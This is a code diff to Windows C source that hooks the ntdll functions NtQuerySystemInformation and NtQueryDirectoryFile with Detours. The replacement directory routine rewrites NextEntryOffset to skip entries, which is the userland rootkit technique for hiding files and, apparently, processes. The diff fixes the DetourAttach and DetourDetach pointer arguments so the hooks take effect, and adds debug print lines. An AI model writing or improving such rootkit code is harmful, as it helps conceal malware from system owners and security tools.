@@ -90,6 +90,7 @@ NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE
                 if (next->NextEntryOffset != 0) {
                     next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
                     current->NextEntryOffset += next->NextEntryOffset;
+                    PRINT("(+) Found File...\n");
                 }
                 else {
                     current->NextEntryOffset = 0;
@@ -109,15 +110,16 @@ VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID h
 
     *originalFunction = GetProcAddress(GetModuleHandleA(dll), function);
     if (*originalFunction)
-        DetourAttach(&originalFunction, hookedFunction);
+        DetourAttach(originalFunction, hookedFunction);
+    PRINT("(I) Hook Initiated...\n");
 
 }
 
 VOID Unhook(LPVOID* originalFunction, LPVOID hookedFunction) {
 
     if (*originalFunction)
-        DetourDetach(&originalFunction, hookedFunction);
-
+        DetourDetach(originalFunction, hookedFunction);
+    PRINT("(I) Hook Uninitiated...\n");
 }
 
 VOID InitializeHooks() {
@@ -127,6 +129,9 @@ VOID InitializeHooks() {
     InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)&g_NtQuerySystemInformation, MyNtQuerySystemInformation);
     InstallHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)&g_NtQueryDirectoryFile, MyNtQueryDirectoryFile);
     DetourTransactionCommit();
+    PRINT("(I) NtQuerySystemInformation -> 0x%p\n(I) NtQueryDirectoryFile -> 0x%p\n", g_NtQuerySystemInformation, g_NtQueryDirectoryFile);
+    
+
 }
 
 VOID UninitializeHooks() {
